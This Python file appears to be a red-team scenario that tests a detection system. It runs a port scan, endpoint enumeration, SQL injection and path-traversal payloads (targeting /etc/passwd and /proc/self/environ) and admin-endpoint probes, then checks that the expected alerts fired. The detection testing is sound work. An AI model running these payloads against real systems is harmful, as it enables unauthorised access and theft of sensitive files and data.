"""
scenario_b.py — Attack Scenario B

Reconnaissance → SQL Injection → Privilege Escalation (3 stages)

Stages
------
  1. Reconnaissance: TCP port scan + API endpoint enumeration.
  2. Exploitation: SQL injection payloads + path traversal.
  3. Privilege escalation: admin endpoint access to reach sensitive data.

Expected kill-chain incidents
  - recon_to_exploitation
  - critical_exploit_attempt
  - data_exfiltration_risk

MITRE ATT&CK: T1046, T1595, T1190, T1083, T1068, T1530
"""

from __future__ import annotations

import argparse
import socket
import time
from datetime import datetime
from urllib.parse import urlparse

from attacker.common import (
    API_URL, BACKEND_URL, Fore, SPEED_MAP,
    DetectionResult, add_speed_arg, log, req, reset_state,
    verify_detections,
)
from attacker import traffic_generator

TAG = "Scenario-B"

EXPECTED_INCIDENTS = [
    "recon_to_exploitation",
    "critical_exploit_attempt",
    "data_exfiltration_risk",
]

SCAN_PORTS = [21, 22, 80, 443, 3000, 5000, 5001, 5432, 6379, 8000, 8080, 9200]

PROBE_ENDPOINTS = [
    "/api/health", "/api/products", "/api/users", "/api/admin/config",
    "/api/admin/users/export", "/api/files", "/swagger", "/docs", "/metrics",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT user(),2,3 --",
    "admin'--",
    "' OR 1=1#",
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "../../../proc/self/environ",
    "..\\..\\..\\windows\\win.ini",
]

PRIV_ESC_ENDPOINTS = [
    "/api/admin/config",
    "/api/admin/users/export",
]


def _target_host() -> str:
    return urlparse(API_URL).hostname or "localhost"


def _tcp_scan(host: str, ports: list[int]) -> list[int]:
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        log(TAG, f"Cannot resolve {host}; emitting synthetic scan result", Fore.YELLOW)
        return [5000, 5001, 8000]
    open_ports = []
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, p)) == 0:
            open_ports.append(p)
        s.close()
    return open_ports


def _stage_1_recon(d: float) -> dict:
    log(TAG, "Stage 1 — Reconnaissance (port scan + endpoint enum)", Fore.YELLOW)
    host = _target_host()
    open_ports = _tcp_scan(host, SCAN_PORTS)
    log(TAG, f"  Scan complete — open ports on {host}: {open_ports}", Fore.CYAN)

    discovered = []
    for ep in PROBE_ENDPOINTS:
        r = req("GET", f"{API_URL}{ep}", timeout=1.5)
        if r is not None and r.status_code < 500:
            discovered.append(ep)
            log(TAG, f"  Endpoint {ep} [{r.status_code}]", Fore.CYAN)
        time.sleep(d * 0.3)

    time.sleep(d * 2)
    return {
        "name":    "reconnaissance",
        "success": len(open_ports) > 0 or len(discovered) > 0,
        "detail":  f"{len(open_ports)} ports open, {len(discovered)} endpoints discovered",
    }


def _stage_2_exploit(d: float) -> dict:
    log(TAG, "Stage 2 — Exploitation (SQLi + path traversal)", Fore.RED)
    sqli_hits = 0
    for payload in SQLI_PAYLOADS:
        r = req("GET", f"{API_URL}/api/products/search", params={"q": payload}, timeout=2)
        if r is not None:
            sqli_hits += 1
            log(TAG, f"  SQLi [{r.status_code}]: {payload[:40]}", Fore.RED)
        time.sleep(d)

    traversal_hits = 0
    for payload in TRAVERSAL_PAYLOADS:
        r = req("GET", f"{API_URL}/api/files", params={"name": payload}, timeout=2)
        if r is not None:
            traversal_hits += 1
            log(TAG, f"  Traversal [{r.status_code}]: {payload}", Fore.RED)
        time.sleep(d)

    time.sleep(d * 2)
    return {
        "name":    "exploitation",
        "success": sqli_hits > 0 and traversal_hits > 0,
        "detail":  f"{sqli_hits} SQLi + {traversal_hits} traversal payloads delivered",
    }


def _stage_3_privesc(d: float) -> dict:
    log(TAG, "Stage 3 — Privilege escalation via admin endpoints", Fore.RED)
    hits = 0
    for ep in PRIV_ESC_ENDPOINTS:
        r = req("GET", f"{API_URL}{ep}", timeout=2)
        code = r.status_code if r is not None else "ERR"
        log(TAG, f"  Admin access [{code}]: {ep}", Fore.RED)
        if r is not None and r.status_code < 500:
            hits += 1
        time.sleep(d)
    return {
        "name":    "privilege_escalation",
        "success": hits > 0,
        "detail":  f"{hits}/{len(PRIV_ESC_ENDPOINTS)} admin endpoints reached",
    }


def run(speed: str = "normal", noise: bool = False) -> dict:
    d = 0.3 * SPEED_MAP.get(speed, 1.0)
    result = DetectionResult(
        scenario="B — Recon → SQL Injection → Privilege Escalation",
        start_time=datetime.now().isoformat(),
    )

    log(TAG, "═" * 60, Fore.CYAN)
    log(TAG, "Scenario B: 3-stage recon-to-exploit kill chain", Fore.CYAN)
    log(TAG, "═" * 60, Fore.CYAN)

    reset_state()
    time.sleep(2)

    def _execute() -> None:
        result.stages.append(_stage_1_recon(d))
        result.stages.append(_stage_2_exploit(d))
        result.stages.append(_stage_3_privesc(d))

    if noise:
        with traffic_generator.background(rate=2.0, verbose=True):
            _execute()
    else:
        _execute()

    verify_detections(result, EXPECTED_INCIDENTS, wait_seconds=6.0, tag=TAG)
    result.end_time = datetime.now().isoformat()
    return result.summary()


def main() -> None:
    parser = argparse.ArgumentParser(description="Scenario B: 3-stage recon → exploit kill chain")
    add_speed_arg(parser)
    args = parser.parse_args()
    summary = run(speed=args.speed, noise=args.noise)
    matched = len(summary.get("matched", []))
    expected = len(summary.get("expected", []))
    log(TAG, f"Result: {matched}/{expected} expected detections", Fore.MAGENTA)


if __name__ == "__main__":
    main()
